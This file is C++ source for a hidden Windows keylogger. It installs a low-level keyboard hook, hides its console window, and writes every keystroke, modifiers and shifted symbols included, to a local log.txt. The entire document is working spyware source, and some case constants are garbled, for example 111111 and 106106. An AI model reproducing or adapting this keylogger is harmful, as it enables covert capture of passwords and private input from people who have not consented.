#include <windows.h>
#include <fstream>

#define AUTHOR "WINTERS";

HHOOK hook;

//KeyStroke Listener
LRESULT CALLBACK BaseControl(int Alpha,WPARAM Beta,LPARAM Gamma)
{
    if(Alpha==HC_ACTION)
    {
        if(Beta==WM_KEYDOWN)
        {
            std::ofstream push("log.txt",std::ios::app);
            KBDLLHOOKSTRUCT *Omega = (KBDLLHOOKSTRUCT *)Gamma;
            DWORD Code = Omega->vkCode;
            switch(Code)
            {
                //For Functionally employed keys
                case(VK_BACK):push<<" <Back> ";push.close();break;
                case(VK_TAB):push<<" <Tab> ";push.close();break;
                case(VK_RETURN):push<<" <Return>\n ";push.close();break;
                case(VK_LSHIFT):push<<" <LS> ";push.close();break;
                case(VK_RSHIFT):push<<" <RS> ";push.close();break;
                case(VK_LCONTROL):push<<" <Lctrl> ";push.close();break;
                case(VK_RCONTROL):push<<" <Rctrl> ";push.close();break;
                case(VK_LMENU):push<<" <Lalt> ";push.close();break;
                case(VK_RMENU):push<<" <Ralt> ";push.close();break;
                case(VK_CAPITAL):push<<" <Cap> ";push.close();break;
                case(VK_ESCAPE):push<<" <Esc> ";push.close();break;
                case(VK_SPACE):push<<" <Space> ";push.close();break;
                case(VK_PRIOR):push<<" <PageUp> ";push.close();break;
                case(VK_NEXT):push<<" <PageDown> ";push.close();break;
                case(VK_END):push<<" <End> ";push.close();break;
                case(VK_HOME):push<<" <Home> ";push.close();break;
                case(VK_LEFT):push<<" <←> ";push.close();break;
                case(VK_RIGHT):push<<" <→> ";push.close();break;
                case(VK_UP):push<<" <↑> ";push.close();break;
                case(VK_DOWN):push<<" <↓> ";push.close();break;
                case(VK_SELECT):push<<" <Select> ";push.close();break;
                case(VK_PRINT):push<<" <Print> ";push.close();break;
                case(VK_INSERT):push<<" <Insert> ";push.close();break;
                case(VK_DELETE):push<<" <Del> ";push.close();break;
                case(VK_HELP):push<<" <Help> ";push.close();break;
                case(VK_PAUSE):push<<" <Pause> ";push.close();break;
                case(VK_CLEAR):push<<" <Clear> ";push.close();break;
                case(VK_F1):push<<" <f1> ";push.close();break;
                case(VK_F2):push<<" <f2> ";push.close();break;
                case(VK_F3):push<<" <f3> ";push.close();break;
                case(VK_F4):push<<" <f4> ";push.close();break;
                case(VK_F5):push<<" <f5> ";push.close();break;
                case(VK_F6):push<<" <f6> ";push.close();break;
                case(VK_F7):push<<" <f7> ";push.close();break;
                case(VK_F8):push<<" <f8> ";push.close();break;
                case(VK_F9):push<<" <f9> ";push.close();break;
                case(VK_F10):push<<" <f10> ";push.close();break;
                case(VK_F11):push<<" <f11> ";push.close();break;
                case(VK_F12):push<<" <f12> ";push.close();break;
                case(91):push<<" <Win> ";push.close();break;
                case(93):push<<" <Document> ";push.close();break;
                case(144):push<<" <Numlock> ";push.close();break;
                case(111111):push<<" </> ";push.close();break;
                case(106106):push<<" <*> ";push.close();break;
                case(109109):push<<" <-> ";push.close();break;
                case(107107):push<<" <+> ";push.close();break;
                case(96):push<<" <0> ";push.close();break;
                case(97):push<<" <1> ";push.close();break;
                case(98):push<<" <2> ";push.close();break;
                case(99):push<<" <3> ";push.close();break;
                case(100):push<<" <4> ";push.close();break;
                case(101):push<<" <5> ";push.close();break;
                case(102):push<<" <6> ";push.close();break;
                case(103):push<<" <7> ";push.close();break;
                case(104):push<<" <8> ";push.close();break;
                case(105):push<<" <9> ";push.close();break;
                case(107):push<<" <+> ";push.close();break;
                case(109):push<<" <-> ";push.close();break;

                //Nums and special chars
                case(48)://0
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" ) ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    };
                };
                case(49)://1
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" ! ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                    };
                };
                case(50)://2
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" @ ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    };
                };
                case(51)://3
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" # ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    };
                };
                case(52)://4
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" $ ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    };
                };
                case(53)://5
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" % ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    };
                };
                case(54)://6
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" ^ ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    };
                };
                case(55)://7
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" & ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    };
                };
                case(56)://8
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" * ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    };
                };
                case(57)://9
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" ( ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    };
                };
                case(219):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" { ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" [ ";
                        push.close();
                        break;
                    };
                };
                case(221):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" } ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" ] ";
                        push.close();
                        break;
                    };
                };
                case(186):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" : ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" ; ";
                        push.close();
                        break;
                    };
                };
                case(222):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" \" ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" ' ";
                        push.close();
                        break;
                    };
                };
                case(220):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" | ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" \\ ";
                        push.close();
                        break;
                    };
                };
                case(188):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" < ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" , ";
                        push.close();
                        break;
                    };
                };
                case(190):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" > ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" . ";
                        push.close();
                        break;
                    };
                };
                case(191):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" ? ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" / ";
                        push.close();
                        break;
                    };
                };
                case(192):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" ~ ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" ` ";
                        push.close();
                        break;
                    };
                };
                case(189):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" _ ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" - ";
                        push.close();
                        break;
                    };
                };
                case(187):
                {
                    if(GetAsyncKeyState(0x10))
                    {
                        push<<" + ";
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<" = ";
                        push.close();
                        break;
                    };
                };
                default:
                {
                    if((Code>64)&&(Code<91)&&!(GetAsyncKeyState(0x10)))
                    {
                        Code+=32;
                        push<<char(Code);
                        push.close();
                        break;
                    }
                    else if((Code>64)&&(Code<91))
                    {
                        push<<char(Code);
                        push.close();
                        break;
                    }
                    else
                    {
                        push<<Code;
                        push.close();
                        break;
                    };
                };
            };
        }
        else
        {
            nullptr;
        };
    }
    else
    {
        CallNextHookEx(hook,Alpha,Beta,Gamma);
    };
    return CallNextHookEx(hook,Alpha,Beta,Gamma);
};

class CLAUDIA
{
    public:
    HHOOK KeyHookCall()
    {
        return hook = SetWindowsHookExA(WH_KEYBOARD_LL,BaseControl,nullptr,0);
    };
    void HideProc()
    {
        AllocConsole();
        HWND Visible=FindWindowA("ConsoleWindowClass",NULL);
        ShowWindow(Visible,0);
    };
};

int main()
{
    CLAUDIA claudia;
    //Dissappear
    claudia.HideProc();
    //Calling the hook function When Key Event Occurs
    claudia.KeyHookCall();
    //Message queue loop
    MSG MsgQueue;
    while(GetMessage(&MsgQueue,nullptr,0,0)!=0){};
    return 0;
};
